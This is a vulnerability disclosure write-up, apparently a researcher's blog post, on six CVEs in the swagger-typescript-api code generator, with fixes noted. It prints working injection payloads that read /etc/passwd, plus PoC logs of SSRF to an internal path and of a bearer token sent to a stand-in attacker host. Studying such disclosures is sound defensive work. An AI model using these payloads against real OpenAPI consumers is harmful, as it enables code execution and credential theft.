---
title: "Six CVEs in swagger-typescript-api"
date: "2026-06-16"
tags:
  - security
  - supply-chain
  - rce
  - ssrf
  - openapi
  - typescript
  - cve
  - code-execution
draft: false
---

This was my first real dive into open-source supply-chain security. I spend my days on web application pentesting, threat intelligence, and CTFs, so npm codegen tooling was new ground for me. I pointed the same methodology I use on web apps at a single package, `swagger-typescript-api`, and walked out with four remote code execution CVEs, one SSRF, and one authorization-token exfiltration. One package, first attempt, six CVEs. The codebase was covered in vulnerabilities. All six are published as GitHub advisories, each now carrying its own CVE, at [github.com/acacode/swagger-typescript-api/security](https://github.com/acacode/swagger-typescript-api/security).

This is not a niche tool. [`swagger-typescript-api`](https://www.npmjs.com/package/swagger-typescript-api) is one of the most widely used OpenAPI-to-TypeScript client generators on npm. At the time of writing it pulls roughly 600,000 downloads a week, more than 2 million a month, and over 21 million in the trailing year, with more than 4,000 GitHub stars, 430 forks, and 196 releases shipped since January 2020. Teams reach for it for one reason: point it at an OpenAPI spec and get a typed Fetch or Axios client back, with no hand-written HTTP layer to maintain. That reach is exactly what turns these findings from one compromised app into a supply-chain problem. Every team that generated a client from a spec they did not author, then compiled and shipped it, was one malicious string away from running the spec author's code.

| CVE | Finding | CVSS | Severity |
|---|---|---|---|---|
| [CVE-2026-54662](https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-hqj5-cw9f-rx67) | fetch baseUrl static initializer, module-load RCE | 8.3 | High |
| [CVE-2026-54661](https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-38c3-wv3c-v3xj) | axios baseUrl constructor, per-instance RCE | 8.3 | High |
| [CVE-2026-54666](https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-w284-33mx-6g9v) | OpenAPI path string, per-call RCE | 8.3 | High |
| [CVE-2026-54664](https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-5f94-x226-ccpm) | enum string value, module-load RCE | 8.3 | High |
| [CVE-2026-54660](https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-h754-fxp7-88wx) | Authorization-token exfiltration via `$ref` | 7.4 | High |
| [CVE-2026-54663](https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-x36r-4347-pm5x) | SSRF via spec `$ref` | 6.1 | Moderate |

All six advisories are published at [github.com/acacode/swagger-typescript-api/security](https://github.com/acacode/swagger-typescript-api/security). Fixes shipped in v13.12.2. Update if you generate clients from third-party or user-supplied specs.

> **Affected:** `swagger-typescript-api <= 13.12.1`
> **Fixed:** 13.12.2
> **Action:** Update immediately if you generate clients from third-party or user-supplied OpenAPI specs. If you have already shipped a generated client built against an untrusted spec, audit the generated files for unexpected static fields, bare blocks, computed property keys, and `${` inside `path` template strings.

## Why a code generator is a better target than the code it generates

The output of a code generator is source code the developer is about to compile, bundle, and import. If the person who wrote the spec controls a string that lands in a code position without escaping, they control what runs. The spec stops being data and becomes code.

`swagger-typescript-api` renders its TypeScript output through EJS templates. EJS gives you two interpolation forms. `<%= %>` HTML-escapes its value. `<%~ %>` emits the value raw. In a tool that produces TypeScript, neither one is correct, because what you actually need is escaping for the surrounding TypeScript context, and HTML-escaping a server URL would just corrupt it. The package has exactly one escaping helper, `escapeJSDocContent` in `schema-formatters.ts`, and all it does is neutralize `*/` so JSDoc comments do not terminate early. It is never applied to any of the sinks in this post. Everything else flows through `<%~ %>` untouched.

That is the whole shape of this class of CVE. Attacker-controlled spec strings reach raw interpolation in a code position. The only question for each finding is which code position, and what runs when execution reaches it.

## Four ways to put an IIFE in someone else's build

### The fetch client's baseUrl fires the moment you import it

The fetch HTTP client template interpolates `servers[0].url` straight into a class-body field initializer at `templates/base/http-clients/fetch-http-client.ejs:75`:

```ejs
public baseUrl: string = "<%~ apiConfig.baseUrl %>";
```

That `<%~ %>` drops the spec's server URL into a TypeScript string literal in the body of the generated `HttpClient` class, with no escaping between the URL and the surrounding class.

A benign spec generates exactly what you would expect:

```ts
export class HttpClient<SecurityDataType = unknown> {
  public baseUrl: string = "https://api.example.com";
  private securityData: SecurityDataType | null = null;
  // ...
}
```

Now I set `servers[0].url` to this:

```text
https://api.example.com"; static _pwn = (async () => { try { const fs = await import('node:fs'); const data = fs.readFileSync('/etc/passwd', 'utf8'); fs.writeFileSync('/tmp/sta_canary', data); } catch (e) {} })(); public x: string = "
```

The leading `"` closes the `baseUrl` string. `static _pwn = (...)();` declares a brand new static class field whose initializer is an async IIFE. The trailing `public x: string = "` reopens a string that the template's own closing `"` then terminates, so the file stays syntactically valid. Generated and Biome-formatted, it comes out like this:

```ts
export class HttpClient<SecurityDataType = unknown> {
  public baseUrl: string = "https://api.example.com";
  static _pwn = (async () => {
    try {
      const fs = await import("node:fs");
      const data = fs.readFileSync("/etc/passwd", "utf8");
      fs.writeFileSync("/tmp/sta_canary", data);
    } catch (e) {}
  })();
  public x: string = "";
  private securityData: SecurityDataType | null = null;
  // ...
}
```

Static field initializers in TypeScript run at class-definition time, which is module load, so a bare `import` of the generated module fires the IIFE with no `new HttpClient()` and no method call. The fact that Biome reformatted the payload into clean multi-line output is itself the proof: Biome only pretty-prints syntactically valid TypeScript, so if it formatted, it parsed.

### The axios client's baseUrl fires one frame later, on construction

Same source variable, different template. The axios client at `templates/base/http-clients/axios-http-client.ejs:71` puts `apiConfig.baseUrl` inside the object literal passed to `axios.create`:

```ejs
this.instance = axios.create({ ...axiosConfig, baseURL: axiosConfig.baseURL || "<%~ apiConfig.baseUrl %>" })
```

Here the injection lands inside an object literal rather than a class body, so I cannot just declare a statement. I can declare a computed property key, and a computed key is an expression that gets evaluated when the object is built. The payload uses `", [(IIFE)()]: 0, dummy: "`, which generates:

```ts
this.instance = axios.create({
  ...axiosConfig,
  baseURL: axiosConfig.baseURL || "https://api.example.com",
  [(async () => {
    try {
      const fs = await import("node:fs");
      const data = fs.readFileSync("/etc/passwd", "utf8");
      fs.writeFileSync("/tmp/sta_canary", data);
    } catch (e) {}
    return "pwned";
  })()]: 0,
  dummy: "",
});
```

The IIFE runs when the object literal is constructed, which is inside the `HttpClient` constructor, so this fires on `new HttpClient()` rather than at module load. That sounds weaker until you read the README, where every example does `const api = new Api()` at module top level and `Api extends HttpClient`, so the constructor runs at first import anyway. The practical trigger window is the same as the fetch sink.

### The OpenAPI path string fires on every call to the method

The procedure-call template at `templates/default/procedure-call.ejs:96` wraps the route path in a backtick template literal:

```ejs
path: `<%~ path %>`,
```

A backtick literal means any `${ ... }` inside the path is live JavaScript that evaluates every time the method builds its path. There is a wrinkle. Before reaching the template, `parseRouteName` rewrites `{x}` and `:x` path-parameter patterns into `${x}` interpolations, and its regex matches a colon followed by a word character. So a literal `node:fs` in my payload would get mangled by the `:f` rewrite. I dodged it by base64-encoding the module name:

```ts
evilCall: (params: RequestParams = {}) =>
  this.request<void, any>({
    path: `/api/${(async () => {
      try {
        const m = Buffer.from("bm9kZTpmcw==", "base64").toString();
        const f = await import(m);
        const d = f.readFileSync("/etc/passwd", "utf8");
        f.writeFileSync("/tmp/sta_canary", d);
      } catch (e) {}
      return "x";
    })()}/items`,
    method: "GET",
    ...params,
  }),
```

`Buffer.from('bm9kZTpmcw==','base64').toString()` decodes to `node:fs` at runtime and contains no colon, so it sails past the path-param rewriter untouched. The IIFE evaluates every time a consumer calls the affected method, and since calling generated methods is the entire point of a generated client, any real use of the client triggers it.

### The enum value fires on import of the types file, and that is the worst one

The other three need you to touch the HTTP client. This one does not. The sink is `Ts.StringValue` in `src/configuration.ts:250`:

```ts
StringValue: (content: unknown) => `"${content}"`,
```

It wraps a value in double quotes with zero escaping. Not a single character is handled. Enum string values from `components.schemas.*.enum[i]` flow through it and get interpolated into the body of a generated `export enum` in `templates/base/enum-data-contract.ejs`.

I gave it this enum value:

```text
blue";}
{(async()=>{try{const fs=await import('node:fs');const d=fs.readFileSync('/etc/passwd','utf8');fs.writeFileSync('/tmp/sta_canary',d);}catch(e){}})();//
```

A control spec with `"enum": ["red", "blue"]` generates a clean enum:

```ts
export enum Color {
  Red = "red",
  Blue = "blue",
}
```

The payload spec generates this, which is the actual output from the PoC run, not a reconstruction:

```ts
    export enum Color {
  Red = "red",
  BlueAsyncTryConstFsAwaitImportNodeFsConstDFsReadFileSyncEtcPasswdUtf8FsWriteFileSyncTmpStaCanaryDCatchE = "blue";}
{(async()=>{try{const fs=await import('node:fs');const d=fs.readFileSync('/etc/passwd','utf8');fs.writeFileSync('/tmp/sta_canary',d);}catch(e){}})();//" 
 }
```

The `";}` closes the string and terminates the enum body. The `{` opens a bare block at module top level, the async IIFE runs inside it, and the trailing `//` comments out the closing `"` that `Ts.StringValue` still appends, so the template's own closing `}` becomes the closing brace of the bare block. The generator even built a SCREAMING-camel-case enum key out of my payload, which is a nice tell that the whole string was treated as an identifier-plus-value and never as a quoted literal.

Here is why this one is the worst of the four. The enum sink lands in `data-contracts.ts`, the types file. Every consumer of a generated client imports that file. Someone who only ever imports a request-body type, who never constructs the client, never calls a method, never goes near the HTTP layer, still imports `data-contracts.ts`. A bare import is enough.

I confirmed it the most boring way possible. Generate, bundle with esbuild, then `await import` the bundle with no instantiation and no method call:

```text
===== TRIGGER - CONTROL (await import only, no construct/call) =====
imported. exports: [ 'Api', 'Color', 'ContentType', 'HttpClient' ]
/tmp/sta_canary after CONTROL: absent

===== TRIGGER - PAYLOAD (await import only, no construct/call) =====
imported. exports: [ 'Api', 'Color', 'ContentType', 'HttpClient' ]

===== CANARY CHECK =====
EXISTS: /tmp/sta_canary (1470 bytes)
--- contents (exfiltrated /etc/passwd) ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
hamza:x:1000:1000:,,,:/home/hamza:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
------------------------------------------
```

The control import wrote no canary. The payload import read the full 1470-byte `/etc/passwd` of the importing process and dropped it at `/tmp/sta_canary`, all from `await import` of a types bundle. That is the entire interaction a developer needs to have for the spec author's code to run on their machine.

## When the generator itself is the request engine

The last two findings are a different class. They do not run in the generated output. They run inside `swagger-typescript-api` while it is generating, and they share a single fetch path.

When the generator resolves a remote spec, `warmUpRemoteSchemasCache` in `src/resolved-swagger-schema.ts` does a breadth-first walk over every external `$ref` in the spec and fetches each one. The fetch at line 374 is plain:

```ts
const response = await fetch(url, {
  headers: this.getRemoteRequestHeaders(),
});
```

The only thing standing between a `$ref` value and that fetch is this:

```ts
private isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value);
}
```

That regex is the entire guard. No private-IP blocklist, no same-origin check, no redirect cap. Any `$ref` that starts with `http://` or `https://` gets fetched.

### SSRF that runs at generation time

So a `$ref` pointing at `127.0.0.1`, an RFC-1918 host, an internal hostname, or `169.254.169.254` cloud IMDS gets fetched while the developer runs `sta generate`. My PoC stands up a loopback "internal" server and a loopback spec server, then points a `$ref` at the internal one:

```text
[control] (no external $ref in spec) → internal-server hits: 0
[payload] ($ref → http://127.0.0.1:<internal-port>/...) → internal-server hits: 1
  hit: /INTERNAL_ONLY_PATH/secret.json  host=127.0.0.1:<internal-port>
```

The internal server received a `GET /INTERNAL_ONLY_PATH/secret.json` issued by the generator during ref resolution, with no network egress controlled by the developer. The loopback target stands in for whatever the generator process can reach: a cloud metadata endpoint, an internal admin panel, a VPN-only service. I also confirmed the redirect-chain variant, where a `$ref` to an external URL that returns a 302 to an internal address still triggers the internal fetch. Node's undici-backed `fetch` follows up to 20 redirects by default, so a naive future fix that only string-matches private IPs in `$ref` values would not stop a redirect from a public host into the internal network.

### The same request carries your bearer token to wherever the $ref points

The fetch above attaches headers from `getRemoteRequestHeaders` at `src/resolved-swagger-schema.ts:81`:

```ts
private getRemoteRequestHeaders(): Record<string, string> {
  return Object.assign(
    {},
    this.config.authorizationToken
      ? { Authorization: this.config.authorizationToken }
      : {},
    (this.config.requestOptions?.headers as Record<string, string> | undefined) || {},
  );
}
```

There is no check that the request's destination shares an origin with the spec source. If you passed `--authorizationToken`, every `$ref` fetch carries it. One malicious `$ref` to an attacker host, and the token rides along verbatim:

```text
[payload] ($ref → http://attacker)
  attacker-server hits: 1
  hit: /EXFIL_ENDPOINT/data.json  Authorization header: Bearer USER_GITHUB_PAT_super_secret_xyz123
  TOKEN LEAKED - attacker server received user-supplied authorizationToken verbatim
```

The attacker server received the developer's full bearer token, sent by the generator while resolving a `$ref`. What makes this one sharp is that `--authorizationToken` is not an exotic flag. It is the documented, normal way to consume any private spec: a GitHub PAT for a private repo, an OAuth bearer for a vendor API, a session token for a wiki-hosted spec. Every developer pulling a spec behind auth is exposed. The two `$ref` findings combine cleanly: the SSRF reaches anywhere the generator can route to, and the token leak means whatever it reaches also receives the credential. Credential theft with a single `$ref`.

## Where I drew the line

These vulnerabilities are evident straight from the published source. The vulnerable template lines and the unescaped `Ts.StringValue` are sitting there in plain sight for anyone who reads the code. I also found a path-traversal sink in `createFile` where a `../` in the output filename escapes the target directory, but I did not file it as its own advisory, because in normal CLI use the attacker model collapses to a user attacking themselves. I noted it for the maintainer and left it there rather than inflate the count.

I filed six separate advisories, one per finding, through GitHub's private advisory channel. js2me published all six within minutes of each other and shipped the fix in v13.12.2. The release notes credit each one the same way:

> Reported by [@thegr1ffyn](https://github.com/thegr1ffyn): [GHSA-5f94-x226-ccpm](https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-5f94-x226-ccpm).

The patch escapes enum string values, escapes `apiConfig.baseUrl` once at the source so both HTTP-client sinks close together, escapes route paths for template-literal insertion while preserving the deliberate `${paramName}` interpolations, and rebuilds the remote-fetch policy to block private and loopback addresses, follow redirects manually with re-validation, and forward the authorization token only to same-origin URLs.

## The lesson

The developer who runs `sta generate --url <spec>` and imports the result did nothing wrong. They used the tool the way the README says to. They did not run `npm install something-shady`. They did not curl-pipe-bash anything. They generated a TypeScript client from an OpenAPI spec and committed it. And the IIFE rode their CI pipeline, their deployed app, and every downstream import in their codebase and in anyone else's codebase who installed their package.

The attacker never touched the developer's machine. They only needed their spec to be the one the developer ran codegen against.

The schema is not data. The schema is code.

## Who I am

I'm Hamza Haroon ([@thegr1ffyn](https://github.com/thegr1ffyn)), a penetration tester working across web application security, threat intelligence, and CTFs. Six CVEs out of a single package, on a first serious look at an area I had not worked in before, is the kind of result that keeps me curious about where else familiar patterns turn up.

If you found this useful, follow along for more write-ups, or get in touch.
